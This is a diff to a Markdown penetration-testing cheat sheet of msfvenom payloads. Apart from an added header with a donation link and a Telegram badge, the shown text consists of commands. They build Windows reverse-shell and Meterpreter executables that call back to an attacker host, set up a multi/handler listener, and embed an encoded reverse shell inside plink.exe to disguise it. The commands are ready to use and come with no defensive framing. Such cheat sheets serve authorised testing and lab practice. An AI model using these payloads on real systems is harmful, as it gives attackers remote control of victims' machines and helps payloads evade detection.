@@ -1,5 +1,15 @@
 # MSFVenom Payloads 
 
+<h1 align="center">
+  <a href="https://github.com/kraloveckey/venom/penetration-testing"><img src="../images/img/hack-logo.png" width=150 height=140 lt="Cyber Cheat Sheet"></a>
+</h1>
+
+[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/kraloveckey)
+
+[![Telegram Channel](https://img.shields.io/badge/Telegram%20Channel-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/cyber_notes)
+
+---
+
 ```shell
 $ msfconsole -q
 ```
@@ -54,6 +64,19 @@ $ msfconsole -q
 
 ### Windows x64 bit reverse shell  
 ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe```
+
+or
+
+```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4443 -f exe -o shell.exe```
+
+``` 
+msfconsole
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost tun0
+set lport 4443
+run
+```
 
 ### Windows reverse shell embedded into plink  
 ```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe```
